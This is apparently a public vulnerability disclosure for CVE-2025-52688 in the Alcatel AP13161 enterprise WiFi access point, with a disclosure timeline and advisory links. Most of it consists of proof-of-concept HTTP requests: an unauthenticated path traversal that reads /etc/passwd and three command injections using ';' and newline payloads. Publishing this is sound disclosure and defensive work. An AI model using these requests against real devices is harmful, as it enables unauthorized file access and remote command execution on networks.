# CVE-2025-52688
## Affected Products
Alcatel AP13161 - Enterprise WIFI access point

## Summary
There are 2 main vulnerabilities being addressed here:
- Lack of input sanization on multiple JSON web parameters that allows malicious characters such as ```;``` to be injected to caused a command injection attack
- Lack of proper sanitization and access control on the ```fileName``` parameters that allows unauthorized arbitary file read on the server

This vulnerability was discovered during SPIRICYBER-24 IoT/OT Hackathon organized by CSA(Cybersecurity Agency of Singapore) & NTU

## POC
### File Read POC
The ```fileName``` parameter allows any unauthenticated user to be able to view any files on the system. By traversing through the directories, we are able to read sensitive files on the server
```
POST /echo.fcgi HTTP/1.1
Host: XXXXX
User-Agent: Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 110
Connection: keep-alive
{
    "id":1,
    "jsonrpc":"2.0",
    "username":"xxx",
    "method":"downloader.cert",
    "params":{
        "fileName":"/../../etc/passwd"
    }
}
```

### RCE POC #1
The ```password``` parameter on ```/apiaccess``` endpoint is vulnerable to unauthenticated command injection vulnerability that allows any unauthenticated users to execute system commands

```
POST /apiaccess HTTP/1.1
Host: XXXX
Cache-Control: max-age=0
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
{
    "id":1,
    "jsonrpc":"2.0",
    "method":"system.getPvc",
    "params":{
        "username": "Administrator",
        "password":";echo pwned1234 > /tmp/test.txt"
    }
}
```

### RCE POC #2
The ```username``` parameter on the ```echo.fcgi``` endpoint is vulnerable to unauthenticated command injection vulnerablity that allows any unauthenticated users to execute system commands

```
POST /echo.fcgi HTTP/1.1
Host: 
Cache-Control: max-age=0
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: application/json, text/plain, */*
{
    "id":1,
    "jsonrpc":"2.0",
    "username":"Administrator",
    "method":"user.logout",
    "params":{
        "username": ";echo pwned > /tmp/test.txt",
        "Sessionid":""
    }
}
```

### RCE POC #3
The ```command``` parameter allows authenticated users to execute system functions and binaries to test the functionality of the lamp post. However, due to insufficient input filtering and blacklist, we are able to bypass the filters to execute an aunthenticated remote code execution that allows any logged in users to execute system commands

```
POST /echo.fcgi HTTP/1.1
Host: XXXX
Content-Length: 349
Accept: application/json, text/plain, */*
Accept-Language: en-GB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
{
    "id":1,
    "jsonrpc":"2.0",
    "method":"expressmessage.call",
    "username":"Administrator",
    "session":"XXXXXX",
    "topic":"WMA/DC:XXXXXXX",
    "params":{
        "version":"3.0",
        "messageID":1,
        "macAddress":"DC:XXXXX",
        "option":"update",
        "method":"ap_manage.exce_command",
        "contents":{
            "command":"tech_support_command 9 127.0.0.1\nid"
       }
    }
}
```

# Timeline

2024-08-10: Report submitted to SpiritCyber IoT Hackathon triage team

2024-08-20: Report accepted by triage team

2025-06-25: CSA SingCert assigns CVE-2025-52688

2025-07-14: Public disclosure

# Advisory
https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2025-072

https://www.al-enterprise.com/-/media/567414972b57459697030898f92ac043.pdf
